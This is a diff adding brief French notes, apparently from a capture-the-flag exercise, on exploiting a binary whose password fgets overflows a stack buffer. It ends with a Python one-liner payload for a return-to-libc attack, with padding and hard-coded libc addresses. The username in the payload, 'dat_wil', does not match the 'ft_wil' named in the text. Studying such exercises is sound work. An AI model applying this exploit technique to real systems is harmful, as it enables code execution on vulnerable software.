@@ -1,0 +1,8 @@
+le binaire prompte un username et un password
+
+d'abord il fait un fgets du username dans une variable globale, avec une taille de 0x100, puis il la compare avec ft_wil
+
+ensuite il fait un fgets du pass dans un buffer sur la pile mais d'une taille plus grande que ce qui est alloue, ensuite il compare avec la chaine "admin" mais il dit incorrect password quoi qu'il arrive
+
+on peut exploiter l'overflow pour faire un ret to libc classique
+python -c "print 'dat_wil' + '\n' + 'b'* 80 + '\xd0\xae\xe6\xf7' + 'OSEF' + '\xec\x97\xf8\xf7'"
